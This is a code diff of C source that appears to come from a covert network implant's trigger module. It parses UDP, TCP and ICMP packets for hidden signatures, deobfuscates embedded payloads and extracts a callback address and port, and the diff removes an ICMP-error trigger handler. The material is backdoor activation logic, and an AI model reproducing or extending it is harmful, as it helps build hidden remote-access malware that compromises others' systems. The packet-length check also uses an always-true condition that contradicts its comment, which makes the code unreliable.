@@ -64,7 +64,7 @@ dt_signature_check (unsigned char *pkt, int len, Payload *p)
 
 	memcpy (&iphdr_temp, ip_pkt, sizeof (struct iphdr_t));
 
-		if (ip_pkt->protocol == IPPROTO_UDP) {
+	if (ip_pkt->protocol == IPPROTO_UDP) {
 		uint16_t pkt_length;
 
 		D (printf ("%s, %4d: Checking UDP Packet...\n", __FILE__, __LINE__); )
@@ -75,12 +75,11 @@ dt_signature_check (unsigned char *pkt, int len, Payload *p)
 		if (pkt_length >= MIN_PACKET_SIZE || pkt_length <= MAX_PACKET_SIZE) // Only check packets that are within valid limits
 			if (dt_raw_udp (udp_pkt, pkt_length, p) == SUCCESS)
 				return SUCCESS;
-
 	}
 	else if (ip_pkt->protocol == IPPROTO_TCP) {
 		uint16_t pkt_length;
 
-//		D (printf ("%s, %4d: Checking TCP Packet...\n", __FILE__, __LINE__); )
+		D (printf ("%s, %4d: Checking TCP Packet...\n", __FILE__, __LINE__); )
 		tcp_pkt = (struct tcphdr_t *) ((unsigned char *) ip_pkt + iphdr_temp.ihl * 4);
 		pkt_length = ntohs(iphdr_temp.tot_len) - (iphdr_temp.ihl * 4) - (tcp_pkt->tcphdrleng * 4);
 
@@ -93,30 +92,6 @@ dt_signature_check (unsigned char *pkt, int len, Payload *p)
 
 	return FAILURE;
 
-}
-
-/*!
- *  \brief ICMP error recevied
- * @param icmp - ICMP header
- * @param p - payload
- * @return Success(0) or Failure(-1)
- */
-int
-dt_error_received (struct icmphdr_t *icmp, Payload * p)
-{
-	packet_ip_t *err_pkt;
-
-	D (printf (" ERROR PKT FOUND\n"); )
-
-	err_pkt = (packet_ip_t *) (((char *) icmp) + sizeof (struct icmphdr_t));
-
-	/* grab the payload from the correct fields */
-	memcpy (p, &((err_pkt->ip).id), 2);
-	memcpy (((uint8_t *) p) + 2, &((err_pkt->ip).daddr), 4);
-	memcpy (((uint8_t *) p) + 6, (uint8_t *) err_pkt->data, 2);
-	memcpy (((uint8_t *) p) + 8, ((uint8_t *) err_pkt->data) + 4, 4);
-
-	return(deobfuscate_payload (p));
 }
 
 //******************************************************************
@@ -271,7 +246,7 @@ payload_to_trigger_info (Payload *p, TriggerInfo *ti)
 
 	ti->callback_addr = p->callback_addr;
 	ti->callback_port = ntohs(p->callback_port);
-	memcpy (&(ti->idKey_hash), &(p->idKey_hash), ID_KEY_HASH_SIZE);
+	memcpy (ti->idKey_hash, p->idKey_hash, ID_KEY_HASH_SIZE);
 
 	return SUCCESS;
 }
@@ -284,11 +259,11 @@ void displaySha1Hash(char *label, unsigned char *sha1Hash)
 	int i=0;
 
 	//Display Label
-	printf( " DEBUG: %s=[", label );
+	printf("%s: ", label);
 
 	//Display 40 hexadecimal number array
 	for (i=0; i < ID_KEY_HASH_SIZE; i++)
 		printf("%02x",sha1Hash[i]);
-	printf( "]\n" );
+	printf( "\n" );
 }
 #endif
